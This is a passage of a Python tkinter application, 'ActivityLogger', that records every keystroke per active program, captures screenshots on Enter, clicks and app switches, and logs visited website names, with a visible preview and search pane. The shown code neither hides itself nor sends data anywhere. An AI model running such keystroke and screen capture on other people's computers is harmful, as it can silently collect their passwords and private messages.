                if key_str:
                    self.session_stats.add_keystroke()
                    
                    if key_str in ["[SHIFT]", "[CTRL_L]", "[CTRL_R]", "[ALT]", "[ALT_R]", "[CMD]", "[CMD_R]", "[TAB]"]:
                        return
                    
                    if key_str == "[BACKSPACE]":
                        with self.context_lock:
                            if self.keystroke_buffer:
                                self.keystroke_buffer.pop()
                        return
                    
                    if key_str == "[ENTER]":
                        self.commit_buffer()
                        with self.context_lock:
                            current_proc = self.current_process
                        if current_proc and self.screenshot_manager:
                            threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(current_proc, "enter"), daemon=True).start()
                        return
                    
                    with self.context_lock:
                        self.keystroke_buffer.append(key_str)
                    
                    log_entry = f"[{process_name}] {key_str}"
                    self.add_log_entry(log_entry, "keyboard")
            except Exception:
                pass
        
        try:
            self.keyboard_listener = keyboard. Listener(on_press=on_key_press)
            self.keyboard_listener.start()
            while not self.stop_event.is_set():
                time.sleep(0.1)
        except Exception:
            pass

    def mouse_logging_task(self):
        def on_mouse_click(x, y, button, pressed):
            if not self.is_logging or self.is_paused or not pressed:
                return
            try: 
                self.idle_detector.activity()
                if button == mouse.Button.left:
                    self.commit_buffer()
                    with self.context_lock:
                        current_proc = self.current_process
                    if current_proc and self.screenshot_manager:
                        threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(current_proc, "click"), daemon=True).start()
            except Exception:
                pass

        def on_mouse_scroll(x, y, dx, dy):
            if not self.is_logging or self.is_paused: 
                return
            try: 
                self.idle_detector.activity()
            except Exception:
                pass
        
        try:
            self.mouse_listener = mouse.Listener(on_click=on_mouse_click, on_scroll=on_mouse_scroll)
            self.mouse_listener.start()
            while not self.stop_event. is_set():
                time. sleep(0.1)
        except Exception:
            pass

    def handle_app_change(self, process_name:  str, window_title: str):
        if self.usage_tracker:
            self.usage_tracker.switch_app(process_name)
        if self.screenshot_manager:
            threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(process_name, "appchange"), daemon=True).start()
        
        if BrowserDetector.is_browser(process_name):
            site_name = BrowserDetector.extract_site_name(window_title)
            if site_name: 
                self.unique_websites.add(site_name)
                log_entry = f"[WEB] {site_name}"
                self.add_log_entry(log_entry, "web")

    def commit_buffer_internal(self, process_name=None, site_name=None):
        if not self.keystroke_buffer or not self.app_logger:
            return
        
        target_process = process_name if process_name is not None else self.current_process
        target_site = site_name if site_name is not None else self.current_site

        if not target_process:
            self.keystroke_buffer.clear()
            return
        
        buffer_text = ''.join(self. keystroke_buffer).replace("[SPACE]", " ").replace("[ENTER]", "\n").strip()
        
        if not buffer_text:
            self.keystroke_buffer.clear()
            return
        
        if BrowserDetector.is_browser(target_process) and target_site:
            self.app_logger.log_browser_visit(target_process, target_site, buffer_text)
        elif SystemAppDetector.is_system_app(target_process):
            self.app_logger.log_system_app(target_process, buffer_text)
        else:
            self.app_logger.log_keyboard(target_process, buffer_text)
        
        self. keystroke_buffer.clear()

    def commit_buffer(self):
        with self.context_lock:
            self.commit_buffer_internal(self.current_process, self.current_site)

    def process_key(self, key) -> Optional[str]:
        try:
            if hasattr(key, "char") and key.char:
                return key.char
            
            key_str = str(key).replace("Key.", "").upper()
            
            key_map = {
                "SPACE":  "[SPACE]",
                "ENTER": "[ENTER]",
                "BACKSPACE": "[BACKSPACE]",
                "TAB": "[TAB]",
                "ESC": "[ESC]",
                "DELETE": "[DELETE]"
            }
            
            if key_str in key_map: 
                return key_map[key_str]
            
            if key_str in ["CTRL_L", "CTRL_R", "SHIFT", "SHIFT_R", "ALT", "ALT_R", "CMD", "CMD_R"]:
                return f"[{key_str}]"
            
            return f"[{key_str}]"
        except Exception:
            return None

    def add_log_entry(self, entry: str, category: str = "keyboard"):
        try:
            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            full_entry = f"[{timestamp}] {entry}"
            self.log_queue.put_nowait((full_entry, category))
            self.queue_ui_update(self.update_preview)
        except queue.Full:
            pass

    def update_preview(self):
        try:
            entries = []
            while not self.log_queue.empty():
                try:
                    entries.append(self.log_queue.get_nowait())
                except queue.Empty:
                    break
            
            if entries: 
                self.preview_text. configure(state=tk.NORMAL)
                for entry, category in entries:
                    parts = entry.split(']', 1)
                    if len(parts) == 2:
                        timestamp_part = parts[0] + ']'
                        content_part = parts[1]
                        self.preview_text.insert(tk.END, timestamp_part, "timestamp")
                        self. preview_text.insert(tk. END, content_part + "\n", category)
                    else:
                        self.preview_text.insert(tk.END, entry + "\n", category)
                
                line_count = int(self.preview_text.index('end-1c').split('.')[0])
                if line_count > 1000:
                    self.preview_text.delete('1.0', f'{line_count - 500}.0')
                
                self.preview_text.see(tk.END)
                self.preview_text.configure(state=tk.DISABLED)
        except Exception:
            pass

    def take_screenshot_manual(self):
        with self.context_lock:
            if self.current_process and self.screenshot_manager:
                threading.Thread(target=lambda: self.screenshot_manager.take_screenshot(self.current_process, "manual"), daemon=True).start()

    def search_logs(self):
        query = self.search_entry.get()
        if not query:
            messagebox.showinfo("Search", "Please enter a search query.")
            return
        
        self.preview_text.configure(state=tk.NORMAL)
        self.preview_text.delete('1.0', tk.END)
        found_count = 0
        
        try:
            pattern = re.compile(query, re.IGNORECASE)
            entries = []
            temp_queue = queue.Queue()
            
            while not self.log_queue.empty():
                try:
                    entry = self.log_queue.get_nowait()
                    entries.append(entry)
                    temp_queue.put(entry)
                except queue.Empty:
                    break
            
            while not temp_queue.empty():
                try:
                    self.log_queue.put_nowait(temp_queue.get_nowait())
                except queue. Full:
                    break
            
            for entry, category in entries:
                if pattern.search(entry):
                    self.preview_text.insert(tk.END, entry + "\n", category)
                    found_count += 1
            
            if found_count == 0:
                self.preview_text.insert(tk.END, "No matches found.\n")
            else:
                self.preview_text.insert(tk.END, f"\n--- Found {found_count} matches ---\n")
        except re.error:
            self.preview_text.insert(tk.END, "Invalid regular expression.\n")
        except Exception as e:
            self.preview_text.insert(tk.END, f"Search error: {str(e)}\n")
        
        self. preview_text.configure(state=tk.DISABLED)

    def open_log_folder(self):
        # --- FIXED METHOD: Uses root_log_dir instead of base_folder ---
        if not self.root_log_dir:
             messagebox.showinfo("Info", "Log folder path not determined yet.")
             return
        
        if not self.root_log_dir.exists():
            messagebox.showinfo("Info", "Log folder has not been created yet. Press Start to create it.")
            return

        folder = self.root_log_dir.resolve()
        try:
            if sys.platform == "win32": 
                os.startfile(str(folder))
            elif sys. platform == "darwin":
                subprocess. Popen(["open", str(folder)])
            else:
                subprocess.Popen(["xdg-open", str(folder)])
        except Exception:
            messagebox.showerror("Error", f"Could not open folder:\n{folder}")

    def queue_ui_update(self, func):
        try:
            self.ui_update_queue.put_nowait(func)
        except queue.Full:
            pass

    def process_ui_updates(self):
        try:
            while not self.ui_update_queue.empty():
                try:
                    func = self.ui_update_queue.get_nowait()
                    func()
                except queue.Empty:
                    break
                except Exception:
                    pass
        except Exception:
            pass
        
        if not self.shutdown_event.is_set():
            self.root.after(100, self.process_ui_updates)

    def on_closing(self):
        self.shutdown_event.set()
        if self.is_logging:
            self.stop_logging()
        if self.hotkey_listener:
            try:
                self.hotkey_listener.stop()
            except Exception:
                pass
        if self.keyboard_listener:
            try: 
                self.keyboard_listener.stop()
            except Exception:
                pass
        if self.mouse_listener:
            try:
                self.mouse_listener.stop()
            except Exception:
                pass
        time.sleep(0.3)
        self.root.destroy()


def main():
    root = tk.Tk()
    app = ActivityLogger(root)
    root.mainloop()


if __name__ == "__main__":
    main()
